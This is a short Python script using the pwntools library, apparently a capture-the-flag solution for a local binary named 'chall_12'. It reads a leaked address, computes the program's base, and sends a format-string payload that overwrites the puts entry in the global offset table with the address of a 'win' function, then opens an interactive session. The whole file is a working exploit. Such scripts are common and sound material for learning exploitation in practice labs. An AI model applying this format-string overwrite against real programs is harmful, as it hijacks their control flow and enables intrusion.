# coding: utf-8
from pwn import *
elf=ELF("./chall_12")
p=process("./chall_12")
p.recvuntil(b": ")
leak = p.recvline()
ileak = int(leak, 16)
start = ileak - 0x000012ef
winad = start + 0x0000124d
elf.got
putsad = start + 13160
payload = fmtstr_payload(7, {putsad: winad}, write_size="byte")
p.sendline(payload)
p.interactive()
